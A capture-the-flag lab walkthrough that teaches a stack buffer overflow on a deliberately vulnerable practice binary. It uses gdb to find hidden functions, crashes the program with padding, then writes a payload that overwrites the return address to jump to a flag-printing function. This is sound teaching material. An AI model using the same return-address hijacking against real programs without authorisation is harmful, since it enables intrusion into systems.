# ðŸš© **Practical: Buffer Overflow Exploit**

---

## ðŸ“Œ **Goal**

Exploit a vulnerable binary by overflowing the buffer and hijacking the return address to jump to a hidden function (`ctf1`, `ctf2`, or `ctf3`) that prints the flag.

---

## ðŸ”¹ **Step 1 â€” Download the Lab**

Download the **vulnerable binary** from GitHub:

```
https://github.com/sandeepw1/securityconcepts.git
```

âœ… Download as ZIP â†’ extract in your **Kali Linux** home folder.

---

## ðŸ”¹ **Step 2 â€” Unzip with Password**

```bash
ls
unzip buff-lab2.zip  # or securityconcepts.zip
# If prompted for password â†’ use: password
```

âœ… Verify you have the binary:

```bash
ls
```

You should see: `buff-lab2`

---

## ðŸ”¹ **Step 3 â€” Install & Launch GDB**

Install GNU Debugger:

```bash
sudo apt update
sudo apt install gdb -y
```

Launch GDB on the binary:

```bash
gdb ./buff-lab2
```

---

## ðŸ”¹ **Step 4 â€” Find Hidden Functions**

Inside `gdb`:

```bash
info functions
```

This lists functions. Note down addresses of:

```
0x08049268  ctf1
0x08049291  ctf2
0x080492ba  ctf3
```

âœ… These hidden functions **print the flag** when called.

---

## ðŸ”¹ **Step 5 â€” Inspect Main**

Check how the binary works:

```bash
disassemble main
```

Youâ€™ll see:

- A `gets()` or `scanf()` that takes input â†’ stores it in a fixed buffer.
- A password check.
- If input too big â†’ overwrites return address.

---

## ðŸ”¹ **Step 6 â€” Generate Initial Overflow**

Close GDB:

```bash
exit
```

Create a file with `30` `A`s:

```bash
python2 -c 'print "A"*30' > attack.txt
cat attack.txt
```

Run the binary:

```bash
sudo ./buff-lab2 < attack.txt
```

Youâ€™ll get:

```
Enter your password:
Sorry Wrong Password!...Try Again!
Segmentation fault (core dumped)
```

âœ… **Segfault means buffer overflow works!**

---

## ðŸ”¹ **Step 7 â€” Test in GDB**

Run again inside `gdb`:

```bash
sudo gdb ./buff-lab2
run < attack.txt
```

You should see:

```
Program received signal SIGSEGV, Segmentation fault.
```

âœ… The `A`s overwrote the return address â†’ program crashes.

Exit:

```bash
exit
```

---

## ðŸ”¹ **Step 8 â€” Build Final Payload**

ðŸ‘‰ The goal is to **overwrite the return address** with the **address of `ctf3`** (`0x080492ba`).

- `A` Ã— (buffer size) + `address`

Example for `28` bytes of `A` + `ctf3` address (little endian):

```bash
python2 -c 'print "A"*28 + "\xba\x92\x04\x08"' > attack.txt
```

---

âœ… Verify:

```bash
cat attack.txt
```

---

## ðŸ”¹ **Step 9 â€” Run Exploit**

```bash
sudo ./buff-lab2 < attack.txt
```

Output:

```
Enter your password:
The flag is..W3ll D0n3.. 8uff3r0verfl0w
```

âœ… ðŸŽ‰ Success â€” you jumped to `ctf3` and got the flag!

---

## ðŸ”¹ **Step 10 â€” Confirm in GDB**

Optional:

```bash
sudo gdb ./buff-lab2
run < attack.txt
```

See:

```
The flag is..W3ll D0n3.. 8uff3r0verfl0w
```

---

## âœ… **Buffer Overflow Lab Recap**

| Step                    | Command                                                       |
| ----------------------- | ------------------------------------------------------------- |
| Install GDB             | `sudo apt install gdb`                                        |
| Open binary in GDB      | `gdb ./buff-lab2`                                             |
| Find function addresses | `info functions`                                              |
| Disassemble main        | `disassemble main`                                            |
| Generate overflow       | `python2 -c 'print "A"*30' > attack.txt`                      |
| Check segfault          | `sudo ./buff-lab2 < attack.txt`                               |
| Craft final payload     | `python2 -c 'print "A"*28 + "\xba\x92\x04\x08"' > attack.txt` |
| Run exploit             | `sudo ./buff-lab2 < attack.txt`                               |

---

## âœ… **How It Works**

- Buffer overflow â†’ overwrites **saved return address**.
- You control **where program jumps** â†’ to hidden `ctf3()`.
- `ctf3()` prints the flag.

---
